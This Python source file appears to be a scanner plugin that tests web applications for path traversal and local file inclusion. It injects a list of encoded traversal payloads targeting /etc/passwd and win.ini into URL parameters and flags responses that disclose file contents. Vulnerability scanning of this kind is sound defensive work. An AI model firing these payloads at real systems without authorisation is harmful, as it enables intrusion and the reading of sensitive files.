"""Path traversal / LFI scanner plugin."""

import logging
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target

logger = logging.getLogger("nightowl")

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "....\\....\\....\\windows\\win.ini",
]

FILE_INDICATORS = {
    "root:x:0:0": "Linux /etc/passwd",
    "[extensions]": "Windows win.ini",
    "[fonts]": "Windows win.ini",
    "daemon:x:": "Linux /etc/passwd",
    "bin:x:": "Linux /etc/passwd",
}


class PathTraversalPlugin(ScannerPlugin):
    name = "path-traversal"
    description = "Test for Local File Inclusion / Path Traversal"
    version = "1.0.0"
    stage = "scan"

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings = []
        url = target.url or f"https://{target.host}"
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            params = {"file": ["index"], "page": ["home"], "path": ["default"]}

        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
                for param_name in params:
                    found = False
                    for payload in LFI_PAYLOADS:
                        if found:
                            break
                        qp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        qp[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(qp)))

                        try:
                            resp = await client.get(test_url)
                            for indicator, desc in FILE_INDICATORS.items():
                                if indicator in resp.text:
                                    findings.append(Finding(
                                        title=f"Path Traversal / LFI in '{param_name}'",
                                        severity=Severity.HIGH,
                                        cvss_score=7.5,
                                        description=f"Local file content ({desc}) disclosed via parameter {param_name}",
                                        evidence=f"URL: {test_url}\nPayload: {payload}\nIndicator: {indicator}",
                                        remediation="Never use user input in file paths. Use a whitelist of allowed files. Implement proper input validation.",
                                        category="path-traversal",
                                        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                                    ))
                                    found = True
                                    break
                        except Exception:
                            continue

        except Exception as e:
            logger.warning(f"Path traversal scan failed: {e}")

        return findings
